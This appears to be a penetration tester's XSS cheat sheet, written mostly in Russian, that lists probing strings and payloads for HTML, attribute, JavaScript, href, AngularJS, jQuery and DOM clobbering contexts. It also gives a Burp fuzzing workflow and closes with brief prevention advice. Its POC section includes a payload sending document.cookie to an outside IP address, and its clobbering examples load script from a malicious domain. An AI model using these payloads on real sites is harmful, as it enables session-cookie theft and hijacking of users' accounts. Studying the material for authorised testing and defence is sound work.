# Поиск точек для ввода
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

### Понять если ли отражение и правила валидации
<b>blablabla</b> 
'';!--"<XSS>=&{()}
<script>alert("script")</script>
<b>blablablabla</b>
<img src=1 onerror=print()>
<video src=x onerror=alert(1)>          
{{ 9 * 9}}                 # {{$on.constructor('alert(1)')()}}
""--blablabla
'"--blablabla 
\"-alert(1)}//

### Payloads 4 context 
use default payload > notice reflected context:

##### XSS between HTML tags
Context
```HTML
<h1>0 search results for {YOUR-PAYLOAD}</h1> // vuln
<h1>0 search results for &lt;b&gt;blablablabla&lt;/b&gt;</h1> // not vuln > encoded
```

Payloads
```js
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```

##### XSS inside HTML tag
Context
```html
<input maxlength="600" type="text" placeholder="Search the blog..." name="search" value="{YOUR-PAYLOAD}">
```

Payloads
```js
"><script>alert(document.domain)</script>
" onfocus=alert(1) autofocus foo="
" autofocus onfocus=alert(document.domain) x="
javascript:alert('xss')
javascript&colon;alert()
javascript:alert%60%60
javascript:\u0061\u006C\u0065\u0072\u0074``
java&#x73;cript:alert()
&apos;-alert(1)-&apos;
'+alert(1)+'
```

##### XSS inside JavaScript
Context
```html
<script>
...
var input = 'YOUR-PAYLOAD';
var message = `0 search results for '{HERE}'`; // XSS in JavaScript template literals > ${alert(document.domain)}
...
</script>
```
Payloads
```js
'- blablabla
'- blablabla//
alert()
'- alert()
';alert(1);//
';alert(document.domain)//
\';alert(document.domain)//
\\';alert(document.domain)//
'-alert-'
${alert(document.domain)}
test\payload
'</script><img src=1 onerror=alert(document.domain)>
```

##### XSS inside href attribute
Context:
```html
<a id="author" href="{YOUR-PAYLOAD}">My web</a>
```
Payload
```js
javascript:alert(1)
```

##### XSS inside tag and inside event
Context:
```html
<a id="author" href="http://www.foo.bar" onclick="var tracker={track(){}};tracker.track('{YOUR-PAYLOAD}');">Web</a>
```
Payload
```js
http://foo.bar&apos;);alert(1);//
```

##### XSS in meta tags
Context:
```html
```

Payload
```js
<meta name="something" onbeforetoggle=alert(1)/>
```

##### XSS in AngularJS sandbox
Context:
```html
<h1 ng-app="" class="ng-scope">0 search results for '{HERE}'</h1>
```
Payload
```js
{{$on.constructor('alert(1)')()}}
```

##### XSS in jQuery
Context
```html
(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
```

Payload
```js
returnPath=javascript:alert(1)
```

### Проверить код страницы на наличие DOM XSS + DOM Invader
```js
>>> window.postMessage('TEST')
    TEST // также проверить где на странице отобразился этот пайлоад
>>> window.postMessage('<img src=x onerror=alert(1)>')
>>> window.postMessage('javascript:print(1)')
```

##### DOM clobbering
Уязвимость присутствует в случае если в JS коде есть переменные которые формируются на основании данных со страницы +
На странице одновременно существуют элементы с одинаковым `id` или `name` на странице HTML и у переменных JS 
Context
```js
let vulnParam = window.vulnParam || '/profile/'; // vulnParam формируется из страницы window, где id=vulnParam
// payload: <a id=vulnParam href='javascript:alert(1)'
// payload: <a id=vulnParam href='phishing.com'

var script = document.createElement('script'); // создается элемент script на странице 
let src = window.config.url || 'script.js'; // src формируется из страницы window, где id=config
s.src = src;
document.body.appendChild(s);
// payload: <a id=config><a id=config name=url href='malicious.js'>

let script = document.createElement('script'); // source from HTML page
script.src = someObject.url;
document.body.appendChild(script); // sink
// payload: <a id=someObject href=//malicious-website.com/malicious.js></a>

let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}; // vuln
// payload: <a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```

##### Common sinks
```
DOM-based vulnerability............Example sink
DOM XSS............................document.write()
Open redirection...................window.location
DOM clobbering.....................var someObject = window.someObject || {}
Cookie manipulation................document.cookie
JavaScript injection...............eval()
Document-domain manipulation.......document.domain
WebSocket-URL poisoning............WebSocket()
Link manipulation..................element.src
Web message manipulation...........postMessage()
Ajax request-header manipulation...setRequestHeader()
Local file-path manipulation.......FileReader.readAsText()
Client-side SQL injection..........ExecuteSql()
HTML5-storage manipulation.........sessionStorage.setItem()
Client-side XPath injection........document.evaluate()
Client-side JSON injection.........JSON.parse()
DOM-data manipulation..............element.setAttribute()
Denial of service..................RegExp()
```

### Проверить отражение в URL \ перенаправление
- простое отражение на странице
https://target/login?target=javascript:alert(1)
https://target/?returnTo=javascript:alert(document.cookie)
- отражение через подстановку второго параметра через &
https://target/?search=1&1%2B1=blablabla (на странице должно произойти сумммирование 1+1, "%2B" это "+")

### Провести фаззинг (API)
Burp Intruder
GET /?search=<§§> HTTP/1.1
Find allowed tags https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
Payload: Copy tags to clipboar and paste
Find 200 responce
Find allowed events
GET /?search=<svg%20§§> HTTP/1.1
Create PoC with payload

### POC
```
onerror=document.location=’http://192.168.48.165:8000/c?c=’+document.cookie>
```
 
# Payloads
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
https://github.com/coffinxp/payloads/tree/main"
https://aszx87410.github.io/beyond-xss/en/

# How to prevent
- использование CSP
- Валидация пользовательского ввода по белым (разрешенным) спискам
- Использование санитизации. Используйте библиотеки, такие как [sanitize-url](https://www.npmjs.com/package/@braintree/sanitize-url) или [DOMPurify](https://www.npmjs.com/package/dompurify). Для приложений обрабатывающих критичные данные, с большим количеством пользователей или имеющих выход в интернет - санитизация и валидация должна быть реализована как на фронтальном так и на серверном компоненте.
- Не передавайте пользовательский ввод в контекст innerHTML
- Не используйте опасные функции eval(),
- При использовании фреймворков (vue.js, react.js, django.py, etc):
    * Никогда не используйте ненадёжные шаблоны 
    ```js
    Vue.createApp({
    template: `<div>` + userProvidedString + `</div>` // НИКОГДА ТАК НЕ ДЕЛАЙТЕ
    }).mount('#app')
    ```